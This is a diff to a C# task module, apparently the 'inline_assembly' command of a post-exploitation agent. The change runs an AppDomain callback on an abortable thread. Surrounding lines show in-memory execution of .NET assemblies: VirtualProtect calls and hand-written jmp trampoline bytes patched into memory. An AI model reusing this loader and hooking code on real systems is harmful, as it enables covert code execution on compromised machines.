@@ -60,7 +60,8 @@ namespace Tasks
         private static string _output = "";
 
         private static bool _completed = false;
-        
+
+        private Thread _assemblyThread;
         
         public inline_assembly(IAgent agent, Task task) : base(agent, task)
         {
@@ -145,6 +146,7 @@ namespace Tasks
 
         public override void Kill()
         {
+            _assemblyThread.Abort();
             _completed = true;
             _cancellationToken.Cancel();
             Complete.Set();
@@ -238,6 +240,7 @@ namespace Tasks
         #region AppDomain Management
         private bool LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
         {
+            bool bRet = false;
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
             isolationDomain.SetThreadPrincipal(
                 new WindowsPrincipal(
@@ -273,7 +276,7 @@ namespace Tasks
 
             if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
             {
-                return false;
+                return bRet;
             }
             int[] patch = new int[3];
 
@@ -284,7 +287,7 @@ namespace Tasks
             uint oldprotect = 0;
             if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
             {
-                return false;
+                return bRet;
             }
             Marshal.WriteByte(codeSleeve, 0x48);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
@@ -293,19 +296,25 @@ namespace Tasks
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
             if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
             {
-                return false;
+                return bRet;
             }
             
             try
             {
-                isolationDomain.DoCallBack(sleeve);
+                _assemblyThread = new Thread(()=>
+                {
+                    isolationDomain.DoCallBack(sleeve);
+                });
+                _assemblyThread.Start();
+                _assemblyThread.Join();
+                bRet = true;
             }
             catch (Exception ex)
             {
-                return false;
+                
             }
             UnloadAppDomain(isolationDomain);
-            return true;
+            return bRet;
         }
         private static void UnloadAppDomain(AppDomain oDomain)
         {
